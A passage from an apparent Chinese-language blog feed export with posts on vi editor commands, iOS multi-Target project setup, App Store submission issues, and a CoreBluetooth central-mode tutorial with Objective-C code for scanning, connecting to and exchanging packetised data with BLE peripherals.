mode）」才能够输入文字。初次使用vi的人都会想先用上下左右键移动光标，结果电脑一直哔哔叫，把自己气个半死，所以进入vi后，先不要乱动，转换到「插入模式（Insert mode）」再说吧！ b) 切换至插入模式（Insert mode）编辑文件 在「命令行模式（command mode）」下按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了。 c) Insert 的切换 您目前处于「插入模式（Insert mode）」，您就只能一直输入文字，如果您发现输错了字！想用光标键往回移动，将该字删除，就要先按一下「ESC」键转到「命令行模式（command mode）」再删除文字 d) 退出vi及保存文件 在「命令行模式（command mode）」下，按一下「：」冒号键进入「Last line mode」，例如： 12345: w filename // （输入 「w filename」将文章以指定的文件名filename保存）: wq // (输入「wq」，存盘并退出vi): q! // (输入q!， 不存盘强制退出vi) 3、命令行模式（command mode）功能键 1）. 插入模式 按「i」切换进入插入模式「insert mode」，按“i”进入插入模式后是从光标当前位置开始输入文件； 按「a」进入插入模式后，是从目前光标所在位置的下一个位置开始输入文字； 按「o」进入插入模式后，是插入新的一行，从行首开始输入文字。 2）. 从插入模式切换为命令行模式 按「ESC」键。 3）. 移动光标 vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母「h」、「j」、「k」、「l」，分别控制光标左、下、上、右移一格。 按「ctrl」+「b」：屏幕往“后”移动一页。 按「ctrl」+「f」：屏幕往“前”移动一页。 按「ctrl」+「u」：屏幕往“后”移动半页。 按「ctrl」+「d」：屏幕往“前”移动半页。 按数字「0」：移到文章的开头。 按「G」：移动到文章的最后。 按「$」：移动到光标所在行的“行尾”。 按「^」：移动到光标所在行的“行首” 按「w」：光标跳到下个字的开头 按「e」：光标跳到下个字的字尾 按「b」：光标回到上个字的开头 按「#l」：光标移到该行的第#个位置，如：5l,56l 4）. 删除文字 「x」：每按一次，删除光标所在位置的“后面”一个字符 「#x」：例如，「6x」表示删除光标所在位置的“后面”6个字符 「X」：大写的X，每按一次，删除光标所在位置的“前面”一个字符 「#X」：例如，「20X」表示删除光标所在位置的“前面”20个字符 「dd」：删除光标所在行 「#dd」：从光标所在行开始删除#行 5）. 复制 「yw」：将光标所在之处到字尾的字符复制到缓冲区中 「#yw」：复制#个字到缓冲区 「yy」：复制光标所在行到缓冲区 「#yy」：例如，「6yy」表示拷贝从光标所在的该行“往下数”6行文字 「p」：将缓冲区内的字符贴到光标所在位置。注意：所有与“y”有关的复制命令都必须与“p”配合才能完成复制与粘贴功能 6）. 替换 「r」：替换光标所在处的字符 「R」：替换光标所到之处的字符，直到按下「ESC」键为止 7）. 回复上一次操作 「u」：如果您误执行一个命令，可以马上按下「u」，回到上一个操作 、按多次“u”可以执行多次回复 8）. 更改 「cw」：更改光标所在处的字到字尾处 「c#w」：例如，「c3w」表示更改3个字 9）. 跳至指定的行 「ctrl」+「g」列出光标所在行的行号 「#G」：例如，「15G」，表示移动光标至文章的第15行行首 4、Last line mode下命令简介 在使用「last line mode」之前，请记住先按「ESC」键确定您已经处于「command mode」下后，再按「：」冒号即可进入「last line mode」 A) 列出行号 「set nu」：输入「set nu」后，会在文件中的每一行前面列出行号 B) 跳到文件中的某一行 「#」：「#」号表示一个数字，在冒号后输入一个数字，再按回车键就会跳到该行了，如输入数字15，再回车，就会跳到文章的第15行 C) 查找字符 「/关键字」：先按「/」键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按「n」会往后寻找到您要的关键字为止 「?关键字」：先按「?」键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按「n」会往前寻找到您要的关键字为止 D) 保存文件 「w」：在冒号输入字母「w」就可以将文件保存起来 E) 离开vi 「q」：按「q」就是退出，如果无法离开vi，可以在「q」后跟一个「!」强制离开vi 「qw」：一般建议离开时，搭配「w」一起使用，这样在退出的时候还可以保存文件 5、vi命令列表 1、下表列出命令模式下的一些键的功能： 123456789101112131415161718192021222324252627282930h 左移光标一个字符h 左移光标一个字符k 光标上移一行j 光标下移一行^ 光标移动至行首0 数字“0”，光标移至文章的开头G 光标移至文章的最后$ 光标移动至行尾Ctrl+f 向前翻屏Ctrl+b 向后翻屏Ctrl+d 向前翻半屏Ctrl+u 向后翻半屏i 在光标位置前插入字符a 在光标所在位置的后一个字符开始增加o 插入新的一行，从行首开始输入ESC 从输入状态退至命令状态x 删除光标后面的字符#x 删除光标后的＃个字符X (大写X) 删除光标前面的字符#X 删除光标前面的#个字符dd 删除光标所在的行#dd 删除从光标所在行数的#行yw 复制光标所在位置的一个字# yw复制光标所在位置的#个字yy 复制光标所在位置的一行#yy 复制从光标所在行数的#行p 粘贴u 取消操作cw 更改光标所在位置的一个字#cw 更改光标所在位置的#个字 2、下表列出行命令模式下的一些指令 123456w filename 储存正在编辑的文件为filenamewq filename 储存正在编辑的文件为filename，并退出viq! 放弃所有修改，退出viset nu 显示行号/或? 查找，在/后输入要查找的内容n 与/或?一起使用，如果查找的内容不是想要找的关键字，按n或向后（与/联用）或向前（与?联用）继续查找，直到找到为止 对于第一次用vi，有几点注意要提醒一下： 1、用vi打开文件后，是处于「命令行模式（command mode）」，您要切换到「插入模式（Insert mode）」才能够输入文字。 切换放方法：在「命令行模式（command mode）」下按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了 2、编辑好后，需从插入模式切换为命令行模式才能对文件进行保存，切换方法：按「ESC」键 3、保存并退出文件：在命令模式下输入:wq即可！（别忘了wq前面的:）]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发多Target（二）：复制Target]]></title>
    <url>%2Farchives%2F9c6697bb.html</url>
    <content type="text"><![CDATA[祝你今天愉快，你明天的愉快留着我明天再祝。 ——王小波《爱你就像爱生命》 项目中复制添加Target注意点 以MultiTarget为例子，复制添加一个Target 如果使用Cocoapods管理项目依赖，一定要先把pods初始化后再复制Target 复制Target后需要重新设置Podfile文件的（多个Target依赖库） 添加文件和素材的时候注意对应的Target选择 打开需要添加Target的项目，选择对应的Target复制 复制完成后修改复制完生成的文件 选择中间的仅复制，复制完成后修改复制的文件 MultiTarget Copy –&gt; MultiTarget_Second MultiTarget-info.plist –&gt; info_second.plist 修改完之后需要选中当前的Target后General里面选择对应的修改后的文件info_second.plist 修改Schemes 的Target名称 MultiTarget Copy –&gt; MultiTarget_Second 配置不同的App图标和启动图 如果需要共用一套图标，注意勾选Target Membership 如果需要设置不同的图片素材对应不同的Target,注意选择不同版本的Target Membership 可以配置： Bundle identifier Display Name Version Bulid 证书 App图标和启动图标 配置不同的标记 配置复制后Target标识，如 TARGET_SECOND=1 注意Debug和Release模式都需要配置 重新配置Podfile文件，重新安装依赖库，如123456789platform :ios, &apos;9.0&apos;target &apos;MultiTarget&apos; do pod &apos;SVProgressHUD&apos;endtarget &apos;MultiTarget_Second&apos; do pod &apos;SVProgressHUD&apos;end 项目中实战 在文件中根据设置的Target标记，区分不同的Target 直接切换不同的Target，即可编译生成对应的app 测试代码逻辑同新建Target一样，直接采用之前的截图]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Multi Target</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发多Target（一）：新建Target]]></title>
    <url>%2Farchives%2Fe016e61f.html</url>
    <content type="text"><![CDATA[在我周围，像我这种性格的人特多——在公众场合什么都不说，到了私下里却妙语连珠，换言之，对信得过的人什么都说，对信不过的人什么都不说。 ——王小波《沉默的大多数》 需求1: 需求不同, App分免费版和专业版 或者分国内版和国际版或者分企业版和App Store版除了个别页面不同, 其他构建页面都完全一样 思考: 第一种:新建两个项目工程开发,把相同的页面封装并拷贝到项目使用 第二种:在同一个项目中,建立两个不同的target进行开发 优劣: 第一种方式:项目之间独立分开,耦合和干扰度小,但是项目开发消耗有点大 第二种方式:节省项目资源拷贝,但是在配置文件和提交到git或者SVN仓库容易冲突 解决方案 使用多Target方式，在原有的基础上面New一个Target 需求2: App需要应对不同的测试需求：开发环境、测试环境、预发布环境、发布环境 需要不同环境的App可以同时运行，以对比不同版本之间的差异 需要不同环境的App运行后有不同的：App名称、图标、启动图等等 解决方案 使用多Target方式，在原有的基础上面Duplicate一个Target Cocoapods需要重新处理 如果项目使用了Cocoapods，那么增加Target后，不管是新建Target或者复制Target都需要处理Podfile文件 方式1123456789101112platform :ios, &quot;8.0&quot;target &quot;MultiTarget&quot; doworkspace &apos;MultiTarget&apos;link_with &apos;MultiTarget&apos;, &apos;MultiTarget_Second&apos;pod &apos;ReactiveCocoa&apos;, &apos;~&gt; 2.5&apos;pod &apos;SVProgressHUD&apos;pod &apos;Masonry&apos;end 方式2 （推荐）1234567891011source &apos;https://github.com/CocoaPods/Specs.git&apos;platform :ios, &apos;8.0&apos;target &apos;MultiTarget&apos; dopod &apos;SVProgressHUD&apos;pod &apos;GoogleMaps&apos;endtarget &apos;MultiTarget&apos; dopod &apos;SVProgressHUD&apos;pod &apos;BaiduMapKit&apos;end 项目中新建Target注意点 以MultiTarget项目为例子，添加一个Target 如果使用Cocoapods管理项目依赖，尽量先把pods初始化后再复制Target 复制Target后需要重新设置Podfile文件的 添加文件和素材的时候注意对应的Target选择 需要手动把另一个Target里面的需要的所有的.m文件和nib文件都在Target Membership 里面勾选 如果有多语言文件也需要在Target Membership 里面勾选 如果配置有pch文件、需要再新建的Target里面重新配置pch文件路径 需要单独配置一些info.plist选项，如网络ATS/权限声明等 需要重新设置一遍依赖Target已经设置过的一些控制面板的属性，如后台，定位，bitcode等 项目新建一个Target 继承配置 删除不需要的默认生成的文件和xib 修改AppDelegate名称，修改其继承自上一个Target的AppDelegate 修改程序启动调用父类的配置信息 修改父类AppDelegate文件权限 可以供两个Target访问 配置不同的标记 在需要配置的Target中添加标记, 如新增加的Target 添加TARGET_SECOND=1 注意Debug和Release模式都需要配置 配置对应的启动图和App图标素材 可以在不同的Targe种配置不同的App图标、启动图、以及其他图标 如果两个Target共用一套图标素材，则在需要共用的Assets.xcassets中的Target Membership中勾选需要共享的Target. 重新配置Podfile文件，重新安装依赖库，如123456789platform :ios, &apos;9.0&apos;target &apos;MultiTarget&apos; do pod &apos;SVProgressHUD&apos;endtarget &apos;MultiTarget_Second&apos; do pod &apos;SVProgressHUD&apos;end 项目中实战 删除项目每个Target中的Main interface 中的Main，不需要从XIB中加载，因为第二个Target是和第一个Target初始化入口相同，在Appdelegate中。 需要两个项目共享的.m xib文件都需要Target Membership中勾选需要共享的Target. 在文件中根据设置的Target标记，区分不同的Target 直接切换不同的Target，即可编译生成对应的app]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Multi Target</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之AppStore篇]]></title>
    <url>%2Farchives%2F9b9b2c59.html</url>
    <content type="text"><![CDATA[iOS开发之AppStore篇– 上架图片尺寸 需要一张通用的1024 x 1024 在App Store里面用 （xcode9 之前在App Store里面上传；xcode9之后在开发工具里面配置） 其格式必须为 JPG 或 PNG，最低分辨率至少为 72 DPI，并采用 RGB 色彩空间 不能包含图层或圆角 不能有透明像素和alpha通道 桌面图标 (app icon) for iPhone6 plus(@3x) : 180 x 180 // 命名规范：App-60@3x for iPhone 6/5s/5/4s/4(@2x) : 120 x 120 // 命名规范：App-60@2x 系统搜索框图标 (Spotlight search results icon) for iPhone6 plus(@3x) : 120 x 120 // 命名规范：Spotlight-40@3x for iPhone6/5s/5/4s/4(@2x) : 80 x 80 // 命名规范：Spotlight-40@2x 系统设置图标 (Settings icon) for iPhone6 plus(@3x) : 87 x 87 // 命名规范：Settings-29@3x for iPhone6/5s/5/4s/4(@2x) : 58 x 58 // 命名规范：Settings-29@2x 启动图片 (launch image) for iPhoen5s/5(@2x) : 640 x 1136 // 命名规范：LaunchImage-568h@2x for iPhone 6(@2x) : 750 x 1334 // 命名规范： LaunchImage-667h@2x for iPhone 6 plus (@3x) : 1242 x 2208 // 命名规范： LaunchImage-736h@3x for iPhoneX (@3x) : 1125 x 2436 // 命名规范： LaunchImage-812h@3x 预览和屏幕快照关于App Store上架电脑系统是测试版或者Xcode是测试版 打包上传出错报如下错误代码，最后通过重装系统（正式版）解决 注意即使用测试版系统或者Xcode打包的程序上传成功、最后上传到AppStore审核的时候也有可能被拒 1ERROR ITMS-90167: &quot;No .app bundles found in the package&quot; 项目中有静态库不支持bitcode上架打包错误1‘xxx/lib**SDK.a(**ForSDK.o)’does not contain bitcode. You must rebuild it with bitcode enabled (Xcodesetting ENABLE_BITCODE), obtain an updated library from the vendor, or disablebitcode for this target. for architecture arm64 解决方法 重新打包静态库，使之支持bitcode 如果静态库比较老，没法重新编译，就需要关闭xcode的bitcode功能 Target -&gt; Build Settings -&gt; Bulid option : Enable Bitcode 设置为NO 项目中有设置URL Schemes1error itms-90158: &quot;the following url schemes found in your app are not in the current format:[mqq://]. 可能是跳转的app id 不正确 app审核通过后AppStore依然搜索不到解决办法 偶尔审核通过但是搜索不到，一般是DNS缓存问题 需要等待苹果服务器刷新 可以通过下面的方法加速刷新 在价格与销售范围里面修改：价格 —&gt; 等级1（收费即可）、销售地区 全部取消只选择 -&gt; 中国, 保存，此时刷新app审核状态就会变为 pending contract（协商价格） 然后再在价格与销售范围里面修改：价格 —&gt; 等级0（app原来的价格 我这里是免费）、销售地区 全部选择 -&gt; 所有地区, 保存，此时刷新app审核状态就会变为 Ready for sale（可供销售） 等待大概半个到一个小时就可以在AppStore里面搜索到了 打包上传后再iTunes connect后台一直看不到上传的包文件 可能是info.plist里面需要配置的申请权限没有配置，这时会收到APPle发送的邮件解释的很清楚，但是有时可能appleID账号是老板的私人邮箱，老板收到又没有及时转发给你，这时候就要找老板问下是否有接收到邮件。 关于游客账户 除社交、和财产挂钩等app可以只提供注册后登录，其他app应视情况提供游客登录模式，在应用内限制游客账户的功能 如果不提供游客账号登录功能一般不会出问题，但是主要看人品，不能确定哪一版本就给拒了App Store 审核指南（中文） 关于和硬件相关的app 我们公司大部分都是和单片机等通讯的硬件产品，关于这类app，上架后需要录制软件和硬件的操作交互视频上传YouTube（建议）或者youku等平台，然后在iTunes connect 里面提供上传视频连接以供审核。]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>App Store</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS蓝牙开发之中心设备篇]]></title>
    <url>%2Farchives%2Fa46fbeec.html</url>
    <content type="text"><![CDATA[当我跨过沉沦的一切，向着永恒开战的时候，你是我的军旗。—— 王小波《爱你就像爱生命》 关于蓝牙4.0 蓝牙4.0是由蓝牙技术联盟在2012年发布的最新蓝牙版本，较3.0版本更省电、成本低、延迟低、超长有效连接距离、AES-128加密等。蓝牙4.0设备因为低耗电，所以也叫做BLE （Bluetooth Low Energy）。 支持两种部署方式：双模式和单模式。 双模式包含传统蓝牙部分（Classsic Bluetooth）和低功耗蓝牙部分（Bluetooth Low Energy 即BLE)。 在BLE4.0之前，连接的蓝牙设备是需要经过MFI认证的 MFI – Make For ipad ,iphone, itouch 等专们为苹果设备制作的设备 Apple设备对BLE4.0支持 iPhone4S及以后的设备 第三代iPad及以后的设备 iMac、MacBookAir、MacBook Pro等 系统是从iOS6开始支持BLE4.0 CoreBluetooth框架 CoreBluetooth是Apple基于蓝牙4.0标准封装的一套蓝牙开发框架，也就是说使用CoreBluetooth开发的时候，对应的蓝牙设备必须也遵循蓝牙4.0。 CoreBluetooth开发分两种模式 中心模式（Central）: 接收周边蓝牙发来的广播数据。 外设模式（Peripheral）: 自己作为蓝牙设备，对外广播数据。 一个外部设备包含一个或多个服务，一个服务包含一个或多个特征。 中心模式的开发流程 建立中心管理者 扫描外设 连接外设 扫描外设中的服务和特征 获取外设的services 获取外设的Characteristics,获取Characteristics的值，获取Characteristics的Descriptor和Descriptor的值 订阅Characteristic 与外设做数据交互(explore and interact) 断开连接(disconnect) 初始化 使用蓝牙需要在inof.plist文件配置Privacy - Bluetooth Peripheral Usage Description KEY向用户请求蓝牙权限 导入蓝牙开发框架遵守两个协议 初始化一个中心设备管理者并设置代理 12345678910#import &lt;CoreBluetooth/CoreBluetooth.h&gt;@interface XSBleManager () &lt;CBCentralManagerDelegate, CBPeripheralDelegate&gt;/** 中心设备管理者 */@property (nonatomic, strong) CBCentralManager *centralManager;@end// 初始化并设置代理_centralManager = [[CBCentralManager alloc] initWithDelegate:self queue:nil]; 监听蓝牙状态改变 初始化蓝牙中心设备管理者之后，会检测并返回当前系统蓝牙状态 当蓝牙处于打开可用状态，我们就可以使用蓝牙发起扫描周边的外设了 1234567891011- (void)centralManagerDidUpdateState:(CBCentralManager *)central;// central.state 即是当前的蓝牙状态typedef NS_ENUM(NSInteger, CBManagerState) &#123; CBManagerStateUnknown = 0, CBManagerStateResetting, // 重置中 CBManagerStateUnsupported, // 不支持 CBManagerStateUnauthorized, // 未授权 CBManagerStatePoweredOff, // 关闭 CBManagerStatePoweredOn, // 打开&#125; NS_ENUM_AVAILABLE(10_13, 10_0); 扫描外设 扫描设别可以扫描周边所有的设备也可以根据服务UUID过滤掉不符合的设备，可根据需求选择 只在必要的时候设置 CBCentralManagerScanOptionAllowDuplicatesKey peripheral 每秒都在发送大量的数据包，scanForPeripheralsWithServices:options:方法会将同一 peripheral 发出的多个数据包合并为一个事件，然后每找到一个 peripheral 都会调用 centralManager:didDiscoverPeripheral:advertisementData:RSSI:方法。另外，当已发现的 peripheral 发送的数据包有变化时，这个代理方法同样会调用。 以上合并事件的操作是 scanForPeripheralsWithServices:options:的默认行为，即未设置 option参数。如果不想要默认行为，可将 option设置为 CBCentralManagerScanOptionAllowDuplicatesKey。设置以后，每收到广播，就会调用上面的回调（无论广播数据是否一样）。关闭默认行为一般用于以下场景：根据 peripheral 的距离来初始化连接（距离可用信号强度 RSSI 来判断）。设置这个 option会对电池寿命和 app 的性能产生不利影响，所以一定要在必要的时候，再对其进行设置。 1234// 方式1 ：扫描所有设备 [_centralManager scanForPeripheralsWithServices:nil options:nil];// 方式2 ：扫描特定的服务的设备 服务UUID可以查询公司文档或者和硬件工程师沟通[_centralManager scanForPeripheralsWithServices:@[[CBUUID UUIDWithString:ServiceUUIDString1], [CBUUID UUIDWithString:ServiceUUIDString2]] options:@&#123; CBCentralManagerScanOptionAllowDuplicatesKey:@YES &#125;]; 扫描成功后就会调用如下方法将外设的名称、标识、信号强度、状态等信息返回 可以在此方法筛选和过滤扫描到的设备，如根据公司外设的命名规定和搜索到的设备名称对比，过滤掉一些不符合的设备 注意点： 如果需要获取蓝牙的名称，推荐从advertisementData中获取，而不要直接获取aPeripheral中的，因为有时候蓝牙设备修改名称 peripheral.name 不会立即刷新，而advertisementData会实时刷新 iOS框架是不能通过Mac地址直接连接蓝牙的而且Apple公司也屏蔽了设备的Mac地址，取代返回的是一个根据某些参数生成的UUID,这一点和安卓不同，并且iOS蓝牙连接外设获取的的唯一标识并不是绝对唯一的: 重启手机就可能导致设备的唯一标识发生变化，而且不同手机连接同一个设备获取到的蓝牙设备标识也是不同的 如果对连接的设备的唯一标识有特别的需求，可以通过和硬件工程师沟通将Mac地址放入advertisementData中来实现获取设备的Mac地址 1234567- (void)centralManager:(CBCentralManager *)central didDiscoverPeripheral:(CBPeripheral *)aPeripheral advertisementData:(NSDictionary *)advertisementData RSSI:(NSNumber *)RSSI&#123; if ([peripheral.namehasPrefix:@"XXX"] ) &#123; // 停止扫描 // 连接设备 &#125;&#125; 连接外设 扫描到外设，就可以发起连接了 注意：连接外设前，需要关闭扫描以省电并减少位置错误发生 12[_centralManager stopScan];// 停止扫描[manager connectPeripheral:peripheral options:nil]; // 连接设备 连接外设成功调用方法，在此方法可以开始扫描服务信息 注意：一定要设置代理，不然扫描到服务信息也不会有代理回调 123456- (void)centralManager:(CBCentralManager *)central didConnectPeripheral:(CBPeripheral *)peripheral&#123; XSLogFunc [peripheral setDelegate:self]; // 设置代理 [peripheral discoverServices:nil]; // 开始扫描服务&#125; 连接外设失败调用方法，此时需要清空代理 12345678- (void)centralManager:(CBCentralManager *)central didFailToConnectPeripheral:(CBPeripheral *)peripheral error:(NSError *)error&#123; XSLogFunc if (peripheral) &#123; peripheral.delegate = nil; peripheral = nil; &#125;&#125; 扫描到外设 扫描到外设服务时如果传入nil, 则代表扫描所有的外设服务 但实际上，你可能只需要其中的某几个。搜索全部的操作既耗时又耗电，所以应该提供一个要搜索的 service 的 UUID 数组 123[peripheral discoverServices:nil]; // 假设你只需要用到 peripheral 提供的众多 service 的两个，那么在搜索 service 的时候可以设置要搜索的 service 的 UUID// [peripheral discoverServices:@[firstServiceUUID, secondServiceUUID]]; 扫描到外设服务的回调 扫描扫服务信息后，既可以去扫描服务里面的特征 1234567- (void)peripheral:(CBPeripheral *)peripheral didDiscoverServices:(NSError *)error&#123; XSLogFunc for (CBService *aService in peripheral.services) &#123; [peripheral discoverCharacteristics:nil forService:aService]; // 扫描服务中的特征 &#125;&#125; 扫描特征 获取到对应的需要的特征，我们既可以对特征进行订阅或者和设别进行数据交互以及升级设备蓝牙信息等等操作 接收 characteristic 数据的方式有两种： 在需要接收数据的时候，调用 readValueForCharacteristic:，这种是需要主动去接收的。 用 setNotifyValue:forCharacteristic:方法订阅，当有数据发送时，可以直接在回调中接收。 1234567891011121314151617181920212223242526272829- (void)peripheral:(CBPeripheral *)peripheral didDiscoverCharacteristicsForService:(CBService *)service error:(NSError *)error&#123; XSLogFunc if (error) &#123; XSLog(@"搜索Characteristic失败:%@", peripheral.services); return; &#125; for (CBCharacteristic *characteristic in service.characteristics) &#123; XSLog(@"搜索到的服务：%@ 对应的所有：Characteristic:%@", service, characteristic); // 具体的特征值的作用请参考公司文档或者和公司硬件工程师沟通 // 可订阅的特征// if ([characteristic.UUID.UUIDString isEqualToString:CharacteristicNotifyUUIDString]) &#123;// [peripheral setNotifyValue:YES forCharacteristic:characteristic];//// &#125; // OTA升级特征// if ([characteristic.UUID.UUIDString isEqual:CharacteristicWriteOTAUUIDString]) &#123;//// &#125; // 可写的特征// if ([characteristic.UUID.UUIDString isEqual:CharacteristicWriteUUIDString]) &#123;//// &#125; &#125;&#125; 特征值类型 123456789101112typedef NS_OPTIONS(NSUInteger, CBCharacteristicProperties) &#123; CBCharacteristicPropertyBroadcast = 0x01, CBCharacteristicPropertyRead = 0x02, CBCharacteristicPropertyWriteWithoutResponse = 0x04, CBCharacteristicPropertyWrite = 0x08, CBCharacteristicPropertyNotify = 0x10, CBCharacteristicPropertyIndicate = 0x20, CBCharacteristicPropertyAuthenticatedSignedWrites = 0x40, CBCharacteristicPropertyExtendedProperties = 0x80, CBCharacteristicPropertyNotifyEncryptionRequired NS_ENUM_AVAILABLE(NA, 6_0) = 0x100, CBCharacteristicPropertyIndicateEncryptionRequired NS_ENUM_AVAILABLE(NA, 6_0) = 0x200&#125;; 读取特征的数据 characteristic 包含了 service 要传输的数据。例如温度设备中表达温度的 characteristic，就可能包含着当前温度值。这时我们就可以通过读取 characteristic，来得到里面的数据。 当找到 characteristic 之后，可以通过调用CBPeripheral的readValueForCharacteristic:方法来进行读取。 当你调用上面这方法后，会回调peripheral:didUpdateValueForCharacteristic:error:方法，其中包含了要读取的数据。如果读取正确，可以用以下方式来获得值： 1234- (void)peripheral:(CBPeripheral *)peripheral didUpdateValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error &#123; NSData *data = characteristic.value; // parse the data as needed&#125; 注意，不是所有 characteristic 的值都是可读的，你可以通过CBCharacteristicPropertyReadoptions 来进行判断（这个枚举会在下一章中介绍到）。如果你尝试读取不可读的数据，那上面的代理方法会返回相应的 error。 订阅 Characteristic 数据 其实使用readValueForCharacteristic:方法并不是实时的。考虑到很多实时的数据，比如心率这种，那就需要订阅 characteristic 了。 可以通过调用CBPeripheral的setNotifyValue:forCharacteristic:方法来实现订阅，注意第一个参数是YES。 1[peripheral setNotifyValue:YES forCharacteristic:interestingCharacteristic]; 如果是订阅，成功与否的回调是peripheral:didUpdateNotificationStateForCharacteristic:error:，读取中的错误会以 error 形式传回： 当然也不是所有 characteristic 都允许订阅，依然可以通过CBCharacteristicPropertyNoifyoptions 来进行判断 123456- (void)peripheral:(CBPeripheral *)peripheral didUpdateNotificationStateForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error &#123; if (error) &#123; XSLog(@"Error changing notification state: %@", [error localizedDescription]); &#125;&#125; 数据写入特征 写数据其实是一个很常见的需求，如果 characteristic 可写，你可以通过CBPeripheral类的writeValue:forCharacteristic:type:方法来向设备写入NSData数据。 CBCharacteristicWriteWithResponse 指定写入成功后回调代理方法 CBCharacteristicWriteWithoutResponse 指定写入成功后不需要回调代理方法 1[_connectedPeripheral writeValue:data forCharacteristic:toCharacteristic type:CBCharacteristicWriteWithResponse]; 如果写入成功后要回调，那么回调方法是peripheral:didWriteValueForCharacteristic:error:。如果写入失败，那么会包含到 error 参数返回。 注意：characteristic 也可能并不支持写操作，可以通过CBCharacteristic的properties属性来判断。 1- (void)peripheral:(CBPeripheral *)peripheral didWriteValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error; 关于数据分包及数据校验的一些扩展 蓝牙4.0因为是低功耗的，所以数据发送的效率就没有之前版本蓝牙的收发效率高，每次接收和发送数据不能超过20个字节 1、写入数据：如果想最大程度的的发挥蓝牙的效率，就需要对发送的数据进行分包处理并且尽可能保证除去协议所占的字节后每包携带的有效数据长度比较大 假设我们发送的每一包数据协议格式为：header(1Byte) + Length(1Byte) + cmd(1Byte) + paramData（&lt;= 16Byte） + check(1Byte) 如果需要发送的数据小于16个字节，直接按协议组装数据发送 如果需要发送的数据大于16个字节，需要按16个字节分包后按协议组装数据发送 1234567891011121314151617181920212223242526272829303132333435363738394041/** 写入不分包数据 @param data 数据 @param toCharacteristic 要写入的特征值 */- (void)writeSinglePacketData:(NSData *)data toCharacteristic:(CBCharacteristic *)toCharacteristic &#123; if (!toCharacteristic || !_bleClient.isBleConnected || kObjectIsEmpty(data)) &#123; return; &#125; self.isContinueWriting = NO; // 是否需要继续写入数据 [_bleClient.connectedPeripheral writeValue:data forCharacteristic:toCharacteristic type:CBCharacteristicWriteWithResponse];&#125;/** 写入需要分包数据 @param data 需要分包发送数据 @param toCharacteristic 要写入的特征值 */- (void)writeMultiplePacketData:(NSData *)data toCharacteristic:(CBCharacteristic *)toCharacteristic &#123; if (!toCharacteristic || !_bleClient.isBleConnected || kObjectIsEmpty(data)) &#123; return; &#125; self.isContinueWriting = YES; // 是否需要继续写入数据 self.subdataOffset = 0; // 已经截取的数据长度 self.needSubData = data; // 需要分包的数据 [self writeSubDataToCharacteristic:toCharacteristic];&#125;/** 将截取的数据发送出去 */- (void)writeSubDataToCharacteristic:(CBCharacteristic *)characteristic &#123; NSInteger totalLength = self.needSubData.length; NSInteger remainLength = totalLength - self.subdataOffset; NSInteger rangLength = remainLength &gt; XSCentralmanagerOTADataSubLength ? XSCentralmanagerOTADataSubLength:remainLength; NSData *data = [self.needSubData subdataWithRange:NSMakeRange(self.subdataOffset, rangLength)]; self.subdataOffset += data.length; if (kObjectIsEmpty(data)) &#123; // 通知代理写入错误 XSLog(@"没有数据可以写入了。。。✍️✍️✍️"); return; &#125; // 继续写入数据 [_bleClient.connectedPeripheral writeValue:data forCharacteristic:characteristic type:CBCharacteristicWriteWithResponse];&#125; self.isContinueWriting标记在每包数据写入成功的回调- (void)blePeripheral:(CBPeripheral *)peripheral didWriteValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error里面是否继续写入下一包数据 2、接收数据：如果接受的数据过大，也会是分包接收到。 所以就需要在接收蓝牙数据的地方，校验接收到的每一包数据长度以确保数据接收完整 可以创建一个数据接收蓝牙数据校验的工具单例 将数据协议定义为一个枚举 提供一个方法传入蓝牙接收到的数据以及一个数据接收完整的回调结果block 每次的数据都按协议进行校验并缓存中间的有效数据 如果已经接收到的有效数据和数据总长度（协议中的发送长度字节）不相同就继续等待接收 如果已经接收到的有效数据和数据总长度（协议中的发送长度字节）相同就代表数据接收完整、回调block 1234567891011121314151617181920212223242526272829303132333435// 在接收到蓝牙数据的方法校验数据- (void)blePeripheral:(CBPeripheral *)peripheral didUpdateValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error &#123; XSLogFunc if (error) &#123; XSLog(@"读取Characteristic数据失败:%@", error); return; &#125; NSData *value = characteristic.value; XSLog(@"读取到特征的数据:%@", value); // 接收到的数据完整性校验 [[XSVerifyBleDataTool shareInstance] handleReceivedDataWithData:value complete:^&#123; NSInteger responseType = XSBleVerifyUtility.responseCmd; if (_dispatchCmdComplete) &#123; _dispatchCmdComplete(responseType); &#125; &#125;];&#125;// 数据校验工具单例XSVerifyBleDataTool提供给外界校验方法typedef NS_ENUM(NSUInteger, XSReceivedDataState) &#123; XSReceivedDataStateHeader, /**&lt; header */ XSReceivedDataStateLength,/**&lt; 数据总长度 */ XSReceivedDataStateData,/**&lt; 数据 */ XSReceivedDataStateCheckSum,/**&lt; 校验和 */&#125;;/** 处理蓝牙接收到的数据 @param receivedData 接收到的数据 @param complete 处理回调 */- (void)handleReceivedDataWithData:(NSData *)receivedData complete:(void (^)(void))complete; 3、关于指令调用 以为可能其他地方也会用到蓝牙，所以推荐把整个蓝牙连接及验证封装成一个蓝牙工具类 因为App和外设交互的指令也会比较多，可能会分散在项目的不同地方，而蓝牙数据的写入和接收都是在代理方法中回调，我的做法是把调用蓝牙指令写入数据的逻辑抽成公共的方法：传需要写入的数据，写入成功的回调Block(可以调用的指令，状态回调回去) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** 派发蓝牙指令 @param command 蓝牙指令 @param paramData 是否需要发送参数 @param complete 